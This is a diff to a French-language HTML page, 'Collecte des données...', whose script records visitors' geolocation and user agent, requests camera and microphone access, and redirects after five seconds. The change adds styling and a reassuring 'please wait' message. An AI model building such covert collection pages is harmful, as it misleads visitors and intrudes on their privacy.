@@ -3,9 +3,23 @@
 <head>
   <meta charset="UTF-8">
   <title>Collecte en cours...</title>
+  <style>
+    body {
+      background-color: #121212;
+      color: #e0e0e0;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #4fc3f7;
+    }
+  </style>
 </head>
 <body>
   <h1>Collecte des données...</h1>
+  <p>Merci de patienter, vous allez être redirigé.</p>
 
   <script>
     // GÉOLOCALISATION
@@ -23,7 +37,7 @@
       localStorage.setItem("geo", "Non supportée");
     }
 
-    // INFOS NAVIGATEUR
+    // INFOS DU NAVIGATEUR
     localStorage.setItem("browser", navigator.userAgent);
 
     // CAMÉRA & MICRO
@@ -38,7 +52,7 @@
         localStorage.setItem("mic", "Refusé");
       });
 
-    // REDIRECTION APRÈS 5 SECONDES
+    // ATTEND 5 secondes puis redirige
     setTimeout(() => {
       window.location.replace("index.html");
     }, 5000);
